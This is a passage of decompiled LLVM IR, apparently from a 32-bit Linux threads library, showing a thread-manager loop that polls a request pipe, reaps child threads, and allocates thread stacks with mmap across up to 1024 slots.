  br label %dec_label_pc_80567f3

dec_label_pc_80567f3:                             ; preds = %dec_label_pc_805684a, %dec_label_pc_8056d86, %dec_label_pc_80567f3thread-pre-split
  %v1_80567f3 = phi i32 [ %v1_80567f3.pr, %dec_label_pc_80567f3thread-pre-split ], [ %v1_8056861, %dec_label_pc_805684a ], [ %v1_8056d86, %dec_label_pc_8056d86 ]
  %v0_80567f3 = load i32, i32* @ebx, align 4
  %v2_80567f3 = add i32 %v1_80567f3, -4
  %v3_80567f3 = inttoptr i32 %v2_80567f3 to i32*
  store i32 %v0_80567f3, i32* %v3_80567f3, align 4
  %v1_80567f4 = add i32 %v1_80567f3, -8
  %v2_80567f4 = inttoptr i32 %v1_80567f4 to i32*
  store i32 2000, i32* %v2_80567f4, align 4
  %v1_80567f9 = add i32 %v1_80567f3, -12
  %v2_80567f9 = inttoptr i32 %v1_80567f9 to i32*
  store i32 1, i32* %v2_80567f9, align 4
  %v1_80567fb = add i32 %v1_80567f3, 324
  store i32 %v1_80567fb, i32* %eax.global-to-local, align 4
  %v2_8056802 = add i32 %v1_80567f3, -16
  %v3_8056802 = inttoptr i32 %v2_8056802 to i32*
  store i32 %v1_80567fb, i32* %v3_8056802, align 4
  %v2_8056803 = load i32, i32* %stack_var_-16, align 4
  %v5_8056803 = call i32 @__libc_poll(%pollfd* %v4_8056803, i32 1, i32 %v2_8056803)
  store i32 %v5_8056803, i32* %eax.global-to-local, align 4
  store i32 %v5_8056803, i32* @ebx, align 4
  %v1_805680a = call i32 @getppid(i32 %arg1)
  store i32 %v1_805680a, i32* %eax.global-to-local, align 4
  %v9_8056812 = icmp eq i32 %v1_805680a, 1
  %v1_8056815 = icmp eq i1 %v9_8056812, false
  br i1 %v1_8056815, label %dec_label_pc_8056825, label %dec_label_pc_8056817

dec_label_pc_8056817:                             ; preds = %dec_label_pc_80567f3
  store i32 0, i32* @edx, align 4
  %v1_8056819 = and i32 %v1_805680a, -256
  %v2_8056819 = or i32 %v1_8056819, 9
  store i32 %v2_8056819, i32* @eax, align 4
  %v0_805681b = call i32 @pthread_kill_all_threads()
  br label %dec_label_pc_8056d21

dec_label_pc_8056825:                             ; preds = %dec_label_pc_80567f3
  %v0_8056825 = load i32, i32* @global_var_8078d20.622, align 32
  store i32 %v0_8056825, i32* %eax.global-to-local, align 4
  %v1_805682a = icmp eq i32 %v0_8056825, 0
  br i1 %v1_805682a, label %dec_label_pc_805683d, label %dec_label_pc_805682e

dec_label_pc_805682e:                             ; preds = %dec_label_pc_8056825
  store i32 0, i32* @global_var_8078d20.622, align 32
  %v0_8056838 = call i32 @pthread_reap_children()
  store i32 %v0_8056838, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805683d

dec_label_pc_805683d:                             ; preds = %dec_label_pc_8056825, %dec_label_pc_805682e
  %v0_805683d = load i32, i32* @ebx, align 4
  %v1_805683d = add i32 %v0_805683d, -1
  %v8_805683d = icmp eq i32 %v1_805683d, 0
  store i32 %v1_805683d, i32* @ebx, align 4
  %v1_805683e = icmp eq i1 %v8_805683d, false
  br i1 %v1_805683e, label %dec_label_pc_80567f3thread-pre-split, label %dec_label_pc_8056840

dec_label_pc_8056840:                             ; preds = %dec_label_pc_805683d
  %v0_8056840 = load i32, i32* @esp, align 4
  %v1_8056840 = add i32 %v0_8056840, 330
  %v2_8056840 = inttoptr i32 %v1_8056840 to i8*
  %v3_8056840 = load i8, i8* %v2_8056840, align 1
  %v4_8056840 = urem i8 %v3_8056840, 2
  %v5_8056840 = icmp eq i8 %v4_8056840, 0
  br i1 %v5_8056840, label %dec_label_pc_80567f3thread-pre-split, label %dec_label_pc_805684a

dec_label_pc_805684a:                             ; preds = %dec_label_pc_8056840
  %v0_805684a = load i32, i32* @ecx, align 4
  %v2_805684a = add i32 %v0_8056840, -4
  %v3_805684a = inttoptr i32 %v2_805684a to i32*
  store i32 %v0_805684a, i32* %v3_805684a, align 4
  %v1_805684b = add i32 %v0_8056840, -8
  %v2_805684b = inttoptr i32 %v1_805684b to i32*
  store i32 148, i32* %v2_805684b, align 4
  %v1_8056850 = add i32 %v0_8056840, 48
  store i32 %v1_8056850, i32* %ecx.global-to-local, align 4
  %v2_8056854 = add i32 %v0_8056840, -12
  %v3_8056854 = inttoptr i32 %v2_8056854 to i32*
  store i32 %v1_8056850, i32* %v3_8056854, align 4
  %v1_8056855 = add i32 %v0_8056840, 352
  %v2_8056855 = inttoptr i32 %v1_8056855 to i32*
  %v3_8056855 = load i32, i32* %v2_8056855, align 4
  %v5_8056855 = add i32 %v0_8056840, -16
  %v6_8056855 = inttoptr i32 %v5_8056855 to i32*
  store i32 %v3_8056855, i32* %v6_8056855, align 4
  %v2_805685c = load i32, i32* %stack_var_-16, align 4
  %v4_805685c = call i32 @__libc_read(i32 %arg1, i32 1, i32 %v2_805685c)
  store i32 %v4_805685c, i32* %eax.global-to-local, align 4
  %v0_8056861 = load i32, i32* @esp, align 4
  %v1_8056861 = add i32 %v0_8056861, 16
  %v1_8056864 = add i32 %v0_8056861, 68
  %v2_8056864 = inttoptr i32 %v1_8056864 to i32*
  %v3_8056864 = load i32, i32* %v2_8056864, align 4
  store i32 %v3_8056864, i32* %eax.global-to-local, align 4
  switch i32 %v1_80567f3, label %dec_label_pc_80567f3 [
    i32 0, label %dec_label_pc_8056876
    i32 1, label %dec_label_pc_8056c73
    i32 2, label %dec_label_pc_8056cc9
    i32 3, label %dec_label_pc_8056d2b
    i32 4, label %dec_label_pc_8056d55
  ]

dec_label_pc_8056876:                             ; preds = %dec_label_pc_805684a
  %v1_8056876 = add i32 %v0_8056861, 64
  %v2_8056876 = inttoptr i32 %v1_8056876 to i32*
  %v3_8056876 = load i32, i32* %v2_8056876, align 4
  store i32 %v3_8056876, i32* %eax.global-to-local, align 4
  %v1_805687a = add i32 %v0_8056861, 72
  %v2_805687a = inttoptr i32 %v1_805687a to i32*
  %v3_805687a = load i32, i32* %v2_805687a, align 4
  store i32 %v3_805687a, i32* @edi, align 4
  %v2_805687e = add i32 %v0_8056861, 20
  %v3_805687e = inttoptr i32 %v2_805687e to i32*
  store i32 %v3_8056876, i32* %v3_805687e, align 4
  %v0_8056882 = load i32, i32* %eax.global-to-local, align 4
  %v1_8056882 = add i32 %v0_8056882, 412
  %v2_8056882 = inttoptr i32 %v1_8056882 to i32*
  %v3_8056882 = load i32, i32* %v2_8056882, align 4
  store i32 %v3_8056882, i32* %edx.global-to-local, align 4
  %v1_8056888 = load i32, i32* @esp, align 4
  %v2_8056888 = add i32 %v1_8056888, 24
  %v3_8056888 = inttoptr i32 %v2_8056888 to i32*
  store i32 %v3_8056882, i32* %v3_8056888, align 4
  %v0_805688c = load i32, i32* @esp, align 4
  %v1_805688c = add i32 %v0_805688c, 60
  %v2_805688c = inttoptr i32 %v1_805688c to i32*
  %v3_805688c = load i32, i32* %v2_805688c, align 4
  store i32 %v3_805688c, i32* %edx.global-to-local, align 4
  %v0_8056890 = load i32, i32* %eax.global-to-local, align 4
  %v1_8056890 = add i32 %v0_8056890, 20
  %v2_8056890 = inttoptr i32 %v1_8056890 to i32*
  %v3_8056890 = load i32, i32* %v2_8056890, align 4
  store i32 %v3_8056890, i32* %ecx.global-to-local, align 4
  %v1_8056893 = add i32 %v0_805688c, 64
  %v2_8056893 = inttoptr i32 %v1_8056893 to i32*
  %v3_8056893 = load i32, i32* %v2_8056893, align 4
  store i32 %v3_8056893, i32* %eax.global-to-local, align 4
  %v2_8056897 = add i32 %v0_805688c, 28
  %v3_8056897 = inttoptr i32 %v2_8056897 to i32*
  store i32 %v3_8056890, i32* %v3_8056897, align 4
  %v0_805689b = load i32, i32* %eax.global-to-local, align 4
  %v1_805689b = load i32, i32* @esp, align 4
  %v2_805689b = add i32 %v1_805689b, 32
  %v3_805689b = inttoptr i32 %v2_805689b to i32*
  store i32 %v0_805689b, i32* %v3_805689b, align 4
  %v0_805689f = load i32, i32* %edx.global-to-local, align 4
  %v1_805689f = load i32, i32* @esp, align 4
  %v2_805689f = add i32 %v1_805689f, 36
  %v3_805689f = inttoptr i32 %v2_805689f to i32*
  store i32 %v0_805689f, i32* %v3_805689f, align 4
  %v1_80568a3 = call i32 @__GI_getpagesize(i32 %arg1)
  store i32 %v1_80568a3, i32* %eax.global-to-local, align 4
  %v0_80568a8 = load i32, i32* @edi, align 4
  %v1_80568a8 = icmp eq i32 %v0_80568a8, 0
  store i32 %v1_80568a3, i32* @ebp, align 4
  br i1 %v1_80568a8, label %dec_label_pc_80568c6, label %dec_label_pc_80568ae

dec_label_pc_80568ae:                             ; preds = %dec_label_pc_8056876
  %v1_80568ae = add i32 %v0_80568a8, 4
  %v2_80568ae = inttoptr i32 %v1_80568ae to i32*
  %v3_80568ae = load i32, i32* %v2_80568ae, align 4
  %v4_80568ae = icmp eq i32 %v3_80568ae, 0
  br i1 %v4_80568ae, label %dec_label_pc_80568c6, label %dec_label_pc_80568b4

dec_label_pc_80568b4:                             ; preds = %dec_label_pc_80568ae
  %v0_80568b4 = call i32 @geteuid()
  store i32 %v0_80568b4, i32* %eax.global-to-local, align 4
  store i32 1, i32* @edx, align 4
  %v1_80568be = icmp eq i32 %v0_80568b4, 0
  %v1_80568c0 = icmp eq i1 %v1_80568be, false
  br i1 %v1_80568c0, label %dec_label_pc_8056c63, label %dec_label_pc_80568c6

dec_label_pc_80568c6:                             ; preds = %dec_label_pc_80568b4, %dec_label_pc_80568ae, %dec_label_pc_8056876
  %v0_80568c6 = load i32, i32* @esp, align 4
  %v1_80568c6 = add i32 %v0_80568c6, 20
  %v2_80568c6 = inttoptr i32 %v1_80568c6 to i32*
  store i32 2, i32* %v2_80568c6, align 4
  %v0_80568ce81 = load i32, i32* @esp, align 4
  %v1_80568ce82 = add i32 %v0_80568ce81, 20
  %v2_80568ce83 = inttoptr i32 %v1_80568ce82 to i32*
  %v3_80568ce84 = load i32, i32* %v2_80568ce83, align 4
  %tmp103 = icmp ult i32 %v3_80568ce84, 1024
  br i1 %tmp103, label %dec_label_pc_80568dc, label %dec_label_pc_8056c4c

dec_label_pc_80568dc:                             ; preds = %dec_label_pc_80568c6, %dec_label_pc_80569cf
  %v3_80568ce91 = phi i32 [ %v3_80568ce, %dec_label_pc_80569cf ], [ %v3_80568ce84, %dec_label_pc_80568c6 ]
  %v0_80568ce90 = phi i32 [ %v0_80568ce, %dec_label_pc_80569cf ], [ %v0_80568ce81, %dec_label_pc_80568c6 ]
  %v2_80568e0 = mul i32 %v3_80568ce91, 16
  store i32 %v2_80568e0, i32* %eax.global-to-local, align 4
  %v1_80568e3 = add i32 %v2_80568e0, 134676808
  %v2_80568e3 = inttoptr i32 %v1_80568e3 to i32*
  %v3_80568e3 = load i32, i32* %v2_80568e3, align 8
  %v4_80568e3 = icmp eq i32 %v3_80568e3, 0
  %v1_80568ea = icmp eq i1 %v4_80568e3, false
  br i1 %v1_80568ea, label %dec_label_pc_80569cf, label %dec_label_pc_80568f0

dec_label_pc_80568f0:                             ; preds = %dec_label_pc_80568dc
  %v0_80568f0 = load i32, i32* @global_var_8078e6c.615, align 4
  store i32 %v0_80568f0, i32* %ecx.global-to-local, align 4
  %v0_80568f6 = load i32, i32* @edi, align 4
  %v1_80568f6 = icmp eq i32 %v0_80568f6, 0
  br i1 %v1_80568f6, label %dec_label_pc_8056922, label %dec_label_pc_80568fa

dec_label_pc_80568fa:                             ; preds = %dec_label_pc_80568f0
  %v1_80568fa = add i32 %v0_80568f6, 24
  %v2_80568fa = inttoptr i32 %v1_80568fa to i32*
  %v3_80568fa = load i32, i32* %v2_80568fa, align 4
  %v4_80568fa = icmp eq i32 %v3_80568fa, 0
  br i1 %v4_80568fa, label %dec_label_pc_8056922, label %dec_label_pc_8056900

dec_label_pc_8056900:                             ; preds = %dec_label_pc_80568fa
  %v1_8056900 = add i32 %v0_80568f6, 28
  %v2_8056900 = inttoptr i32 %v1_8056900 to i32*
  %v3_8056900 = load i32, i32* %v2_8056900, align 4
  store i32 %v3_8056900, i32* %edx.global-to-local, align 4
  %v1_8056907 = and i32 %v3_8056900, -4
  store i32 %v1_8056907, i32* %eax.global-to-local, align 4
  %v2_805690a = add i32 %v0_80568f6, 32
  %v3_805690a = inttoptr i32 %v2_805690a to i32*
  %v4_805690a = load i32, i32* %v3_805690a, align 4
  %v5_805690a = sub i32 %v3_8056900, %v4_805690a
  store i32 %v5_805690a, i32* @ebp, align 4
  %v1_805690d = add i32 %v1_8056907, -480
  store i32 %v1_805690d, i32* @esi, align 4
  store i32 1, i32* @global_var_807e578.619, align 8
  br label %dec_label_pc_80569bd

dec_label_pc_8056922:                             ; preds = %dec_label_pc_80568fa, %dec_label_pc_80568f0
  %v1_8056922 = add i32 %v0_80568ce90, 40
  %v2_8056922 = inttoptr i32 %v1_8056922 to i32*
  store i32 2097152, i32* %v2_8056922, align 4
  %v0_805692a = load i32, i32* @esp, align 4
  %v1_805692a = add i32 %v0_805692a, 40
  %v2_805692a = inttoptr i32 %v1_805692a to i32*
  %v3_805692a = load i32, i32* %v2_805692a, align 4
  %v4_805692a = load i32, i32* @ebp, align 4
  %v5_805692a = sub i32 %v3_805692a, %v4_805692a
  store i32 %v5_805692a, i32* %v2_805692a, align 4
  %v0_805692e = load i32, i32* @edi, align 4
  %v1_805692e = icmp eq i32 %v0_805692e, 0
  br i1 %v1_805692e, label %dec_label_pc_8056922.dec_label_pc_8056947_crit_edge, label %dec_label_pc_8056932

dec_label_pc_8056922.dec_label_pc_8056947_crit_edge: ; preds = %dec_label_pc_8056922
  %v0_8056947.pre = load i32, i32* @esp, align 4
  %v0_8056953.pre.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8056947

dec_label_pc_8056932:                             ; preds = %dec_label_pc_8056922
  %v0_8056932 = load i32, i32* @ebp, align 4
  store i32 %v0_8056932, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v2_8056936 = add i32 %v0_805692e, 32
  %v3_8056936 = inttoptr i32 %v2_8056936 to i32*
  %v4_8056936 = load i32, i32* %v3_8056936, align 4
  %v5_8056936 = add i32 %v0_8056932, -1
  %v1_8056939 = add i32 %v5_8056936, %v4_8056936
  %tmp49 = urem i32 %v1_8056939, %v0_8056932
  store i32 %tmp49, i32* @edx, align 4
  %v4_805693c = sub i32 %v1_8056939, %tmp49
  store i32 %v4_805693c, i32* %eax.global-to-local, align 4
  store i32 %v4_805693c, i32* @ebx, align 4
  %v0_8056941 = load i32, i32* @esp, align 4
  %v1_8056941 = add i32 %v0_8056941, 40
  %v2_8056941 = inttoptr i32 %v1_8056941 to i32*
  %v3_8056941 = load i32, i32* %v2_8056941, align 4
  %v10_8056941 = icmp ult i32 %v3_8056941, %v4_805693c
  %v1_8056945 = icmp eq i1 %v10_8056941, false
  br i1 %v1_8056945, label %dec_label_pc_805694b, label %dec_label_pc_8056947

dec_label_pc_8056947:                             ; preds = %dec_label_pc_8056922.dec_label_pc_8056947_crit_edge, %dec_label_pc_8056932
  %v0_8056953.pre = phi i32 [ %v0_8056953.pre.pre, %dec_label_pc_8056922.dec_label_pc_8056947_crit_edge ], [ %tmp49, %dec_label_pc_8056932 ]
  %v0_8056947 = phi i32 [ %v0_8056947.pre, %dec_label_pc_8056922.dec_label_pc_8056947_crit_edge ], [ %v0_8056941, %dec_label_pc_8056932 ]
  %v1_8056947 = add i32 %v0_8056947, 40
  %v2_8056947 = inttoptr i32 %v1_8056947 to i32*
  %v3_8056947 = load i32, i32* %v2_8056947, align 4
  store i32 %v3_8056947, i32* @ebx, align 4
  br label %dec_label_pc_805694b

dec_label_pc_805694b:                             ; preds = %dec_label_pc_8056932, %dec_label_pc_8056947
  %v0_8056953 = phi i32 [ %tmp49, %dec_label_pc_8056932 ], [ %v0_8056953.pre, %dec_label_pc_8056947 ]
  %v1_8056953 = phi i32 [ %v0_8056941, %dec_label_pc_8056932 ], [ %v0_8056947, %dec_label_pc_8056947 ]
  %v2_805694b = add i32 %v1_8056953, 20
  %v3_805694b = inttoptr i32 %v2_805694b to i32*
  %v4_805694b = load i32, i32* %v3_805694b, align 4
  %v6_805694b = mul i32 %v4_805694b, -2097152
  store i32 %v6_805694b, i32* %eax.global-to-local, align 4
  %v2_8056953 = add i32 %v1_8056953, -4
  %v3_8056953 = inttoptr i32 %v2_8056953 to i32*
  store i32 %v0_8056953, i32* %v3_8056953, align 4
  %v0_8056954 = load i32, i32* @edx, align 4
  %v2_8056954 = add i32 %v1_8056953, -8
  %v3_8056954 = inttoptr i32 %v2_8056954 to i32*
  store i32 %v0_8056954, i32* %v3_8056954, align 4
  %v0_8056955 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8056955 = load i32, i32* %eax.global-to-local, align 4
  %v2_8056955 = add i32 %v0_8056955, 2096672
  %v3_8056955 = add i32 %v2_8056955, %v1_8056955
  store i32 %v3_8056955, i32* @esi, align 4
  %v0_805695c = load i32, i32* @global_var_807d134.638, align 4
  %v2_8056961 = mul i32 %v0_805695c, 4
  store i32 %v2_8056961, i32* %eax.global-to-local, align 4
  %v2_8056966 = sub i32 %v3_8056955, %v2_8056961
  store i32 %v2_8056966, i32* %ecx.global-to-local, align 4
  %v1_8056968 = add i32 %v1_8056953, -12
  %v2_8056968 = inttoptr i32 %v1_8056968 to i32*
  store i32 0, i32* %v2_8056968, align 4
  %v1_805696a = add i32 %v1_8056953, -16
  %v2_805696a = inttoptr i32 %v1_805696a to i32*
  store i32 -1, i32* %v2_805696a, align 4
  %v1_805696c = add i32 %v1_8056953, -20
  %v2_805696c = inttoptr i32 %v1_805696c to i32*
  store i32 306, i32* %v2_805696c, align 4
  %v1_8056971 = add i32 %v1_8056953, -24
  %v2_8056971 = inttoptr i32 %v1_8056971 to i32*
  store i32 7, i32* %v2_8056971, align 4
  %v0_8056973 = load i32, i32* %eax.global-to-local, align 4
  %v2_8056973 = add i32 %v1_8056953, -28
  %v3_8056973 = inttoptr i32 %v2_8056973 to i32*
  store i32 %v0_8056973, i32* %v3_8056973, align 4
  %v0_8056974 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8056976 = add i32 %v0_8056974, 480
  store i32 %v1_8056976, i32* %eax.global-to-local, align 4
  %v2_805697b = add i32 %v1_8056953, -32
  %v3_805697b = inttoptr i32 %v2_805697b to i32*
  store i32 %v1_8056976, i32* %v3_805697b, align 4
  %v2_805697c = load i32, i32* %stack_var_-16, align 4
  %v9_805697c = call i32 @mmap(i32 %arg1, i32 1, i32 %v2_805697c, i32 %v0_805672f, i32 %v0_805672e, i32 %v0_805672d, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8056981 = load i32, i32* @esp, align 4
  %v1_8056981 = add i32 %v0_8056981, 32
  %v1_8056984 = add i32 %v9_805697c, 1
  %v8_8056984 = icmp eq i32 %v1_8056984, 0
  store i32 %v1_8056984, i32* %eax.global-to-local, align 4
  br i1 %v8_8056984, label %dec_label_pc_80569cf, label %dec_label_pc_8056987

dec_label_pc_8056987:                             ; preds = %dec_label_pc_805694b
  %v0_8056987 = load i32, i32* @esi, align 4
  %v1_8056989 = load i32, i32* @ebx, align 4
  %v2_8056989 = sub i32 %v0_8056987, %v1_8056989
  store i32 %v2_8056989, i32* %eax.global-to-local, align 4
  %v2_805698b = add i32 %v0_8056981, 72
  %v3_805698b = inttoptr i32 %v2_805698b to i32*
  %v4_805698b = load i32, i32* %v3_805698b, align 4
  %v15_805698b = icmp eq i32 %v1_8056989, %v4_805698b
  %v1_805698f = add i32 %v2_8056989, 480
  store i32 %v1_805698f, i32* @ebp, align 4
  br i1 %v15_805698b, label %dec_label_pc_80569bd, label %dec_label_pc_8056997

dec_label_pc_8056997:                             ; preds = %dec_label_pc_8056987
  %v0_8056997 = load i32, i32* @edi, align 4
  %v1_8056997 = add i32 %v0_8056997, 20
  %v2_8056997 = inttoptr i32 %v1_8056997 to i32*
  %v3_8056997 = load i32, i32* %v2_8056997, align 4
  store i32 %v3_8056997, i32* %eax.global-to-local, align 4
  %v2_805699c = sub i32 %v1_805698f, %v3_8056997
  store i32 %v2_805699c, i32* %edx.global-to-local, align 4
  %v2_805699e = add i32 %v0_8056981, 40
  %v3_805699e = inttoptr i32 %v2_805699e to i32*
  store i32 %v3_8056997, i32* %v3_805699e, align 4
  %v0_80569a2 = load i32, i32* %edx.global-to-local, align 4
  %v1_80569a2 = load i32, i32* @esp, align 4
  %v2_80569a2 = add i32 %v1_80569a2, 12
  %v3_80569a2 = inttoptr i32 %v2_80569a2 to i32*
  store i32 %v0_80569a2, i32* %v3_80569a2, align 4
  %v0_80569a6 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80569a6 = load i32, i32* @esp, align 4
  %v2_80569a6 = add i32 %v1_80569a6, -4
  %v3_80569a6 = inttoptr i32 %v2_80569a6 to i32*
  store i32 %v0_80569a6, i32* %v3_80569a6, align 4
  %v0_80569a7 = load i32, i32* %ecx.global-to-local, align 4
  %v2_80569a7 = add i32 %v1_80569a6, -8
  %v3_80569a7 = inttoptr i32 %v2_80569a7 to i32*
  store i32 %v0_80569a7, i32* %v3_80569a7, align 4
  %v1_80569a8 = add i32 %v1_80569a6, -12
  %v2_80569a8 = inttoptr i32 %v1_80569a8 to i32*
  store i32 0, i32* %v2_80569a8, align 4
  %v1_80569aa = add i32 %v1_80569a6, -16
  %v2_80569aa = inttoptr i32 %v1_80569aa to i32*
  store i32 -1, i32* %v2_80569aa, align 4
  %v1_80569ac = add i32 %v1_80569a6, -20
  %v2_80569ac = inttoptr i32 %v1_80569ac to i32*
  store i32 16, i32* %v2_80569ac, align 4
  %v1_80569ae = add i32 %v1_80569a6, -24
  %v2_80569ae = inttoptr i32 %v1_80569ae to i32*
  store i32 0, i32* %v2_80569ae, align 4
  %v0_80569b0 = load i32, i32* %eax.global-to-local, align 4
  %v2_80569b0 = add i32 %v1_80569a6, -28
  %v3_80569b0 = inttoptr i32 %v2_80569b0 to i32*
  store i32 %v0_80569b0, i32* %v3_80569b0, align 4
  %v0_80569b1 = load i32, i32* %edx.global-to-local, align 4
  %v2_80569b1 = add i32 %v1_80569a6, -32
  %v3_80569b1 = inttoptr i32 %v2_80569b1 to i32*
  store i32 %v0_80569b1, i32* %v3_80569b1, align 4
  %v2_80569b2 = load i32, i32* %stack_var_-16, align 4
  %v9_80569b2 = call i32 @mmap(i32 %arg1, i32 1, i32 %v2_80569b2, i32 %v0_805672f, i32 %v0_805672e, i32 %v0_805672d, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_80569b7 = load i32, i32* @esp, align 4
  %v1_80569b7 = add i32 %v0_80569b7, 32
  %v1_80569ba = add i32 %v9_80569b2, 1
  %v8_80569ba = icmp eq i32 %v1_80569ba, 0
  store i32 %v1_80569ba, i32* %eax.global-to-local, align 4
  %v1_80569bb = icmp eq i1 %v8_80569ba, false
  br i1 %v1_80569bb, label %dec_label_pc_80569d8, label %dec_label_pc_80569bd

dec_label_pc_80569bd:                             ; preds = %dec_label_pc_8056997, %dec_label_pc_8056987, %dec_label_pc_8056900
  %v0_80569bd = phi i32 [ %v1_80569b7, %dec_label_pc_8056997 ], [ %v1_8056981, %dec_label_pc_8056987 ], [ %v0_80568ce90, %dec_label_pc_8056900 ]
  %v1_80569bd = add i32 %v0_80569bd, 12
  %v2_80569bd = inttoptr i32 %v1_80569bd to i32*
  store i32 0, i32* %v2_80569bd, align 4
  %v0_80569c5 = load i32, i32* @esp, align 4
  %v1_80569c5 = add i32 %v0_80569c5, 8
  %v2_80569c5 = inttoptr i32 %v1_80569c5 to i32*
  store i32 0, i32* %v2_80569c5, align 4
  %v1_80569d8.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80569d8

dec_label_pc_80569cf:                             ; preds = %dec_label_pc_805694b, %dec_label_pc_80568dc
  %v17_80569cf = phi i32 [ %v1_8056981, %dec_label_pc_805694b ], [ %v0_80568ce90, %dec_label_pc_80568dc ]
  %v1_80569cf = add i32 %v17_80569cf, 20
  %v2_80569cf = inttoptr i32 %v1_80569cf to i32*
  %v3_80569cf = load i32, i32* %v2_80569cf, align 4
  %v4_80569cf = add i32 %v3_80569cf, 1
  store i32 %v4_80569cf, i32* %v2_80569cf, align 4
  %v0_80568ce = load i32, i32* @esp, align 4
  %v1_80568ce = add i32 %v0_80568ce, 20
  %v2_80568ce = inttoptr i32 %v1_80568ce to i32*
  %v3_80568ce = load i32, i32* %v2_80568ce, align 4
  %tmp104 = icmp ult i32 %v3_80568ce, 1024
  br i1 %tmp104, label %dec_label_pc_80568dc, label %dec_label_pc_8056c4c

dec_label_pc_80569d8:                             ; preds = %dec_label_pc_8056997, %dec_label_pc_80569bd
  %v1_80569d8 = phi i32 [ %v1_80569b7, %dec_label_pc_8056997 ], [ %v1_80569d8.pre, %dec_label_pc_80569bd ]
  %v0_80569d8 = load i32, i32* @ebx, align 4
  %v2_80569d8 = add i32 %v1_80569d8, -4
  %v3_80569d8 = inttoptr i32 %v2_80569d8 to i32*
  store i32 %v0_80569d8, i32* %v3_80569d8, align 4
  %v1_80569d9 = add i32 %v1_80569d8, -8
  %v2_80569d9 = inttoptr i32 %v1_80569d9 to i32*
  store i32 480, i32* %v2_80569d9, align 4
  %v1_80569de = add i32 %v1_80569d8, -12
  %v2_80569de = inttoptr i32 %v1_80569de to i32*
  store i32 0, i32* %v2_80569de, align 4
  %v0_80569e0 = load i32, i32* @esi, align 4
  %v2_80569e0 = add i32 %v1_80569d8, -16
  %v3_80569e0 = inttoptr i32 %v2_80569e0 to i32*
  store i32 %v0_80569e0, i32* %v3_80569e0, align 4
  %v2_80569e1 = load i32, i32* %stack_var_-16, align 4
  %v5_80569e1 = call i32 @__GI_memset(i8* %v4_80569e1, i32 1, i32 %v2_80569e1)
  %v0_80569e6 = load i32, i32* @global_var_8074140.629, align 64
  %v1_80569eb = add i32 %v0_80569e6, 1
  %v0_80569ec = load i32, i32* @esp, align 4
  store i32 %v1_80569eb, i32* @global_var_8074140.629, align 64
  %v0_80569f4 = load i32, i32* @global_var_8078d28.639, align 8
  %v1_80569f9 = add i32 %v0_80569f4, 1024
  store i32 %v1_80569f9, i32* %eax.global-to-local, align 4
  %v0_80569fe = load i32, i32* @esi, align 4
  store i32 %v0_80569fe, i32* @ebx, align 4
  store i32 %v1_80569f9, i32* @global_var_8078d28.639, align 8
  %v2_8056a05 = add i32 %v0_80569ec, 36
  %v3_8056a05 = inttoptr i32 %v2_8056a05 to i32*
  %v4_8056a05 = load i32, i32* %v3_8056a05, align 4
  %v5_8056a05 = add i32 %v4_8056a05, %v1_80569f9
  store i32 %v5_8056a05, i32* %eax.global-to-local, align 4
  %v2_8056a09 = add i32 %v0_80569ec, 32
  %v3_8056a09 = inttoptr i32 %v2_8056a09 to i32*
  store i32 %v5_8056a05, i32* %v3_8056a09, align 4
  %v0_8056a0d = load i32, i32* %eax.global-to-local, align 4
  %v1_8056a0d = load i32, i32* @esi, align 4
  %v2_8056a0d = add i32 %v1_8056a0d, 16
  %v3_8056a0d = inttoptr i32 %v2_8056a0d to i32*
  store i32 %v0_8056a0d, i32* %v3_8056a0d, align 4
  %v0_8056a10 = load i32, i32* @esp, align 4
  %v1_8056a10 = add i32 %v0_8056a10, 20
  %v2_8056a10 = inttoptr i32 %v1_8056a10 to i32*
  %v3_8056a10 = load i32, i32* %v2_8056a10, align 4
  %v0_8056a14 = load i32, i32* @esi, align 4
  %v1_8056a14 = add i32 %v0_8056a14, 72
  %v2_8056a17 = mul i32 %v3_8056a10, 16
  store i32 %v2_8056a17, i32* %edx.global-to-local, align 4
  %v2_8056a1a = add i32 %v0_8056a14, 68
  %v3_8056a1a = inttoptr i32 %v2_8056a1a to i32*
  store i32 %v1_8056a14, i32* %v3_8056a1a, align 4
  %v0_8056a1d = load i32, i32* @esi, align 4
  %v1_8056a1d = add i32 %v0_8056a1d, 80
  store i32 %v1_8056a1d, i32* %eax.global-to-local, align 4
  %v1_8056a20 = add i32 %v0_8056a1d, 64
  %v2_8056a20 = inttoptr i32 %v1_8056a20 to i8*
  store i8 0, i8* %v2_8056a20, align 1
  %v0_8056a24 = load i32, i32* %edx.global-to-local, align 4
  %v1_8056a24 = add i32 %v0_8056a24, 134676800
  store i32 %v1_8056a24, i32* %ecx.global-to-local, align 4
  %v0_8056a2a = load i32, i32* @esi, align 4
  %v1_8056a2a = add i32 %v0_8056a2a, 65
  %v2_8056a2a = inttoptr i32 %v1_8056a2a to i8*
  store i8 0, i8* %v2_8056a2a, align 1
  %v0_8056a2e = load i32, i32* %ecx.global-to-local, align 4
  %v1_8056a2e = load i32, i32* @esi, align 4
  %v2_8056a2e = add i32 %v1_8056a2e, 28
  %v3_8056a2e = inttoptr i32 %v2_8056a2e to i32*
  store i32 %v0_8056a2e, i32* %v3_8056a2e, align 4
  %v0_8056a31 = load i32, i32* %eax.global-to-local, align 4
  %v1_8056a31 = load i32, i32* @esi, align 4
  %v2_8056a31 = add i32 %v1_8056a31, 76
  %v3_8056a31 = inttoptr i32 %v2_8056a31 to i32*
  store i32 %v0_8056a31, i32* %v3_8056a31, align 4
  %v0_8056a34 = load i32, i32* @esp, align 4
  %v1_8056a34 = add i32 %v0_8056a34, 12
  %v2_8056a34 = inttoptr i32 %v1_8056a34 to i32*
  %v3_8056a34 = load i32, i32* %v2_8056a34, align 4
  store i32 %v3_8056a34, i32* %eax.global-to-local, align 4
  %v0_8056a38 = load i32, i32* @edi, align 4
  %v1_8056a38 = icmp eq i32 %v0_8056a38, 0
  %v1_8056a3a = load i32, i32* @esi, align 4
  %v2_8056a3a = add i32 %v1_8056a3a, 396
  %v3_8056a3a = inttoptr i32 %v2_8056a3a to i32*
